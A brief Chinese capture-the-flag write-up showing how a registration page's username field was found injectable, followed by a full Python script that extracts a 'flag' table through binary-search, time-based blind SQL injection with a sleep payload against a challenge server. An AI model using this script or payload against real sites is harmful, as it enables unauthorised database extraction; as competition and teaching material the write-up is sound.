发现注册页

![](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251001152927560.png)

注入username字段成功

![](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251001152927561.png)

编写二分时间盲注脚本

```python
import requests
import time

url = "http://61.147.171.35:65370/register.php"
data = {
    'email': 'spark@panic404.cn',
    'username': '',
    'password': '1'
}

def inject_post():
    result=""
    s = requests.Session()
    
    # 二分搜索
    for i in range(1,1000):
        # 可打印字符范围
        low=32
        high=128
        mid=(low+high)//2

        while low<high:
            payload=f"0'+(CASE WHEN ascii(substr((select * from flag) from {i} for 1))<{mid} THEN sleep(1) ELSE 1 END)+'0"
            data['username'] = payload
            data['email'] = f"{i}_{mid}@b.com"
  
            start_time=time.time()
            s.post(url=url,data=data,verify=False,allow_redirects=False) # 不跟随重定向
            end_time=time.time()

            if end_time-start_time>1:
                high=mid
            else:
                low=mid+1
            mid=(low+high)//2
            
        if mid<33 or mid>127:
            break
        result += chr(mid-1)
        print(result)

inject_post()
```

输出

![](https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251001152927562.png)

<p style="text-align: right;">
by. Spark0618
</p>
